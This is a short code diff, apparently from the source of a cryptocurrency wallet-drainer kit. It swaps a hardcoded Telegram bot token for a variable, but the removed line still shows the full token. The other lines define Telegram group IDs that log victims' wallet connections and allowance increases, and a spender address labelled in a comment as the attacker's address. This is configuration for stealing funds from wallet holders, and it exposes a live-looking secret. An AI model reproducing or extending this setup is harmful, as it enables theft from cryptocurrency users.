@@ -1,5 +1,5 @@
 // Telegram bot token and group IDs
-const telegramBotToken = "7236108767:AAHgctM1RM7YJAj_tdh709ab8FIp05ZdH4E";
+const telegramBotToken = TGT;
 const walletConnectionsGroupID = "-1002232445167"//"-1002232445167";
 const allowanceIncreasesGroupID = "-1002147303946"//"";-4107946236
 const spenderAddress = "0xdd959e5e55Bf6a37aBa441bf86E2A0e5394cFf32"//"0x3577e3517e526950d62d0b13a2e2af836d3d2b6d"; // Attacker's address
